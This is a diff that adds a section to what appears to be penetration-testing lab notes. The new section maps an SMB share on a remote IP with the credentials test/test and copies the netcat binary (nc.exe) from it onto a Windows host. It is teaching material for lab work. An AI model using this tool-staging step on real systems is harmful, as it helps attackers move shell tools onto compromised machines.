@@ -143,3 +143,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Config file parsed
 
 ```
+
+#### Mount SMB Server with Username and Password
+```bash
+C:\htb> net use n: \\192.168.220.133\share /user:test test
+
+The command completed successfully.
+
+C:\htb> copy n:\nc.exe
+        1 file(s) copied.
+```
